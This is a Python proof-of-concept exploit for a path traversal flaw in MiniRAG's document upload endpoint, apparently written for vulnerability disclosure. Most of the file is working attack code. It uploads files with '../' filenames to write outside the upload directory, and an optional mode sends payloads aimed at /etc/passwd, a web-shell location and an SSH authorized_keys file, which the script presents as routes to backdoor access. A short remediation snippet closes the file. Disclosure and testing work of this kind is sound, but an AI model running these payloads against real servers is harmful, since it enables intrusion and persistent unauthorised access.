#!/usr/bin/env python3
"""
PoC: Path Traversal in MiniRAG /documents/upload Endpoint
CVE: TBD
CVSS: 7.5 (High)

Target: MiniRAG server with document upload enabled
Repository: https://github.com/HKUDS/MiniRAG
Vulnerable File: minirag/api/minirag_server.py:1091

Requirements:
    pip install requests

Usage:
    python3 minirag_poc.py --target http://target-server:9621
"""

import argparse
import requests
import sys


def check_path_traversal(target_url: str) -> bool:
    """
    Check if the target is vulnerable to path traversal.
    
    This PoC attempts to write a file outside the intended directory.
    """
    
    print(f"[*] Testing MiniRAG server at {target_url}")
    print(f"[*] Endpoint: POST /documents/upload")
    print(f"[*] Payload: filename = '../../tmp/minirag_pwned.txt'")
    print(f"[*] Expected result: File written to /tmp/minirag_pwned.txt")
    print()
    
    # Endpoint for document upload
    endpoint = f"{target_url}/documents/upload"
    
    # File content to upload
    file_content = b"Xinference Path Traversal PoC - Server Compromised\n"
    
    # Malicious filename with path traversal
    # The vulnerability is that file.filename is used directly without sanitization
    # file_path = doc_manager.input_dir / file.filename
    # No os.path.basename() or ".." check!
    malicious_filename = "../../tmp/minirag_pwned.txt"
    
    print(f"[*] Sending malicious filename: {malicious_filename}")
    print()
    
    try:
        # Prepare multipart form data
        files = {
            'file': (malicious_filename, file_content, 'text/plain')
        }
        
        print(f"[*] Sending request to {endpoint}...")
        response = requests.post(endpoint, files=files, timeout=30)
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response body: {response.text[:300]}")
        print()
        
        if response.status_code == 200:
            if "success" in response.text.lower():
                print("[+] Request successful!")
                print("[+] If vulnerable, file was written to /tmp/minirag_pwned.txt")
                print("[+] Check the server filesystem to confirm exploitation")
                return True
            else:
                print("[-] Request returned 200 but may have failed")
                return False
        elif response.status_code == 400:
            print("[-] Server rejected the request (400 Bad Request)")
            print("[-] May have some validation in place")
            return False
        else:
            print(f"[-] Request failed with status {response.status_code}")
            return False
            
    except requests.exceptions.ConnectionError:
        print(f"[-] Cannot connect to {target_url}")
        print("[-] Make sure the MiniRAG server is running")
        return False
    except requests.exceptions.Timeout:
        print(f"[-] Request timed out")
        return False
    except Exception as e:
        print(f"[-] Error: {e}")
        return False


def test_additional_payloads(target_url: str):
    """
    Test additional path traversal payloads.
    """
    print()
    print("[*] Testing additional payloads...")
    print()
    
    payloads = [
        "../../../etc/passwd.txt",  # Try to read passwd (will fail but shows attempt)
        "../../webapp/shell.txt",   # Web shell upload attempt
        "../../.ssh/authorized_keys.txt",  # SSH key injection
    ]
    
    endpoint = f"{target_url}/documents/upload"
    file_content = b"test"
    
    for payload in payloads:
        print(f"[*] Testing: {payload}")
        files = {'file': (payload, file_content, 'text/plain')}
        try:
            response = requests.post(endpoint, files=files, timeout=10)
            print(f"    Status: {response.status_code}")
        except Exception as e:
            print(f"    Error: {e}")


def verify_exploitation(target_url: str):
    """
    Show verification commands.
    """
    print()
    print("[*] To verify exploitation:")
    print("    ssh user@target-server 'cat /tmp/minirag_pwned.txt'")
    print()
    print("[*] If file exists, the server is VULNERABLE")
    print("[*] Potential impact:")
    print("    - Overwrite SSH keys for backdoor access")
    print("    - Overwrite config files for privilege escalation")
    print("    - Write web shell if directory is web-accessible")


def main():
    parser = argparse.ArgumentParser(
        description="MiniRAG Path Traversal Proof of Concept"
    )
    parser.add_argument(
        "--target",
        required=True,
        help="MiniRAG server URL (e.g., http://localhost:9621)"
    )
    parser.add_argument(
        "--advanced",
        action="store_true",
        help="Test additional payloads"
    )
    parser.add_argument(
        "--verify",
        action="store_true",
        help="Show verification commands"
    )
    
    args = parser.parse_args()
    
    print("=" * 70)
    print("MiniRAG Path Traversal Proof of Concept")
    print("=" * 70)
    print()
    
    # Test vulnerability
    is_vulnerable = check_path_traversal(args.target)
    
    if args.advanced:
        test_additional_payloads(args.target)
    
    if args.verify:
        verify_exploitation(args.target)
    
    print()
    print("=" * 70)
    print("REMEDIATION:")
    print("=" * 70)
    print()
    print("Add filename sanitization in minirag/api/minirag_server.py:1091:")
    print()
    print("  import os")
    print("  safe_filename = os.path.basename(file.filename)")
    print("  if '..' in file.filename or os.path.isabs(file.filename):")
    print("      raise HTTPException(status_code=400, detail='Path traversal detected')")
    print("  file_path = doc_manager.input_dir / safe_filename")
    print()
    
    return 0 if is_vulnerable else 1


if __name__ == "__main__":
    sys.exit(main())
